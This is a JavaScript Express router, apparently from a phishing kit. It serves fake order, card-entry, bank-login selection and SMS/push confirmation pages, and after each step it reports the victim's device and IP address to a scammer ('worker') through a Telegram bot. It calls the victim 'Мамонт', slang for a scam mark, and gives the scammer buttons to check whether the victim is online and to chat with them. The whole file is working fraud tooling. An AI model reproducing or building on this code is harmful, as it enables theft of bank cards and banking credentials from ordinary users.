const express = require("express");
const { Telegram, Markup } = require("telegraf");

const userAgent = require("express-useragent");

const router = express.Router();

const config = require("../../config");
const getCurCode = require("../../handlers/functions/getCurCode");
const {
  users,
  items,
  services,
  Logs,
  settings,
  countries,
  BanList,
} = require("../../database/index");

const translate = require("../translate");

const bot = new Telegram(config.bot.token);

function reqInfo(req) {
  try {
    var text = ``;
    const userInfo = userAgent.parse(req.headers["user-agent"]);
    text += `${
      userInfo.isMobile
        ? "📱 Телефон"
        : userInfo.isDesktop
        ? "🖥 Компьютер"
        : userInfo.isBot
        ? "🤖 Бот"
        : "📟 Что-то другое"
    } (${userInfo.browser})
ℹ️ ${req.socket.remoteAddress.replace("::ffff:", "")}`;

    return text;
  } catch (err) {
    return "\nнет данных";
  }
}

// главная страница

router.get("/order/:itemId", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.params.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    var url;

    if (Settings.lk == true && country.lk == true)
      url = `/pay/personal/${item.id}`;
    else url = `/pay/merchant/${item.id}`;

    await bot.sendMessage(
      item.workerId,
      `📄 <b>Переход на главную страницу</b>

${reqInfo(req)}`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`)],
          ...(worker.supportType == "bot"
            ? [
                [
                  Markup.callbackButton(`Написать`, `suppportReply_${item.id}`),
                  Markup.callbackButton(`Чат`, `chat_${item.id}`),
                ],
              ]
            : []),
        ]),
      }
    ).catch((err) => err);

    return res.render(
      `${item.serviceCode.split("_")[1]}/${item.serviceCode.split("_")[0]}`,
      {
        item,
        worker,
        curr: await getCurCode(service.currency),
        url,
      }
    );
  } catch (err) {
    console.log(err);
  }
});

// ввода карты ЛК

router.get("/merchants/:token", async (req, res) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: req.params.token,
      },
    });

    if (!log) return res.sendStatus(404);

    const item = await items.findOne({
      where: {
        id: log.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    await bot.sendMessage(
      item.workerId,
      `<b>💳 Страница ввода карты</b>

${reqInfo(req)}`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`)],
          ...(worker.supportType == "bot"
            ? [
                [
                  Markup.callbackButton(`Написать`, `suppportReply_${item.id}`),
                  Markup.callbackButton(`Чат`, `chat_${item.id}`),
                ],
              ]
            : []),
        ]),
      }
    ).catch((err) => err);

    return res.render(`lkCard`, {
      log,
      service,
      worker,
      item,
      translate: translate[service.country],
      title: service.title.replace(/[^a-zA-Z]+/g, ""),
      curr: await getCurCode(service.currency),
    });
  } catch (err) {
    console.log(err);
  }
});

// главный ввод карты

router.get("/merchant/:itemId", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.params.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    // const ban = await BanList.count({
    //   where: {
    //     ip: req.headers["x-forwarded-for"],
    //   },
    // });

    // if (ban > 0) return res.sendStatus(404);

    await bot.sendMessage(
      item.workerId,
      `<b>💳 Страница ввода карты</b>

${reqInfo(req)}`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`)],
          ...(worker.supportType == "bot"
            ? [
                [
                  Markup.callbackButton(`Написать`, `suppportReply_${item.id}`),
                  Markup.callbackButton(`Чат`, `chat_${item.id}`),
                ],
              ]
            : []),
          // [
          //   Markup.callbackButton(`Написать`, `suppportReply_${item.id}`),
          //   Markup.callbackButton(`Чат`, `chat_${item.id}`),
          // ],
          // [
          //   Markup.callbackButton(
          //     `Запретить доступ`,
          //     `ban_${req.headers["x-forwarded-for"]}`
          //   ),
          // ],
        ]),
      }
    ).catch((err) => err);

    return res.render(`card`, {
      service,
      worker,
      item,
      translate: translate[service.country],
      title: service.title.replace(/[^a-zA-Z]+/g, ""),
      curr: await getCurCode(service.currency),
    });
  } catch (err) {
    console.log(err);
  }
});

// страница ввода лк

router.post("/personal/:itemId", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.params.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    const bank = req.body.bank;

    await bot.sendMessage(
      item.workerId,
      `💰 <b>Мамонт выбрал банк</b>

🏦 <b>Банк:</b> ${bank}

${reqInfo(req)}`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`)],
          ...(worker.supportType == "bot"
            ? [
                [
                  Markup.callbackButton(`Написать`, `suppportReply_${item.id}`),
                  Markup.callbackButton(`Чат`, `chat_${item.id}`),
                ],
              ]
            : []),
        ]),
      }
    ).catch((err) => err);

    return res.render(`lk/${item.serviceCode.split("_")[1]}/${req.body.bank}`, {
      item,
      worker,
      translate: translate[service.country],
      curr: await getCurCode(service.currency),
    });
  } catch (err) {
    console.log(err);
  }
});

// страница выбора лк

router.get("/personal/:itemId", async (req, res) => {
  try {
    const item = await items.findOne({
      where: {
        id: req.params.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    await bot.sendMessage(
      item.workerId,
      `🏦 <b>Переход на страницу выбора банка</b>

${reqInfo(req)}`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`)],
          ...(worker.supportType == "bot"
            ? [
                [
                  Markup.callbackButton(`Написать`, `suppportReply_${item.id}`),
                  Markup.callbackButton(`Чат`, `chat_${item.id}`),
                ],
              ]
            : []),
        ]),
      }
    ).catch((err) => err);

    return res.render(`lk/${item.serviceCode.split("_")[1]}/select`, {
      item,
      worker,
      curr: await getCurCode(service.currency),
    });
  } catch (err) {
    console.log(err);
  }
});

// смс и пуш подтверждение

router.get("/merchant/confirm-:action/:logId", async (req, res) => {
  try {
    const log = await Logs.findOne({
      where: {
        id: req.params.logId,
      },
    });

    if (!log) return res.sendStatus(404);

    const item = await items.findOne({
      where: {
        id: log.itemId,
      },
    });

    if (!item) return res.sendStatus(404);

    const service = await services.findOne({
      where: {
        code: item.serviceCode,
      },
    });

    const country = await countries.findOne({
      where: {
        code: service.country,
      },
    });

    const worker = await users.findOne({
      where: {
        id: item.workerId,
      },
    });

    const Settings = await settings.findOne({ where: { id: 1 } });

    if (Settings.work == false) return res.render("wait");

    if (worker.siteStatus == false) return res.render("wait");

    // const ban = await BanList.count({
    //   where: {
    //     ip: req.headers["x-forwarded-for"],
    //   },
    // });

    // if (ban > 0) return res.sendStatus(404);

    await bot.sendMessage(
      item.workerId,
      `<b>🕓 Ожидание ${req.params.action.toUpperCase()}-подтверждения</b>

${reqInfo(req)}`,
      {
        parse_mode: "HTML",
        reply_to_message_id: item.msgId,
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`)],
          ...(worker.supportType == "bot"
            ? [
                [
                  Markup.callbackButton(`Написать`, `suppportReply_${item.id}`),
                  Markup.callbackButton(`Чат`, `chat_${item.id}`),
                ],
              ]
            : []),
          // [
          //   Markup.callbackButton(`Написать`, `suppportReply_${item.id}`),
          //   Markup.callbackButton(`Чат`, `chat_${item.id}`),
          // ],
          // [
          //   Markup.callbackButton(
          //     `Запретить доступ`,
          //     `ban_${req.headers["x-forwarded-for"]}`
          //   ),
          // ],
        ]),
      }
    ).catch((err) => err);

    return res.render(`errors/${req.params.action}`, {
      log,
      service,
      worker,
      item,
      translate: translate[service.country],
      curr: await getCurCode(service.currency),
    });
  } catch (err) {
    console.log(err);
  }
});

module.exports = router;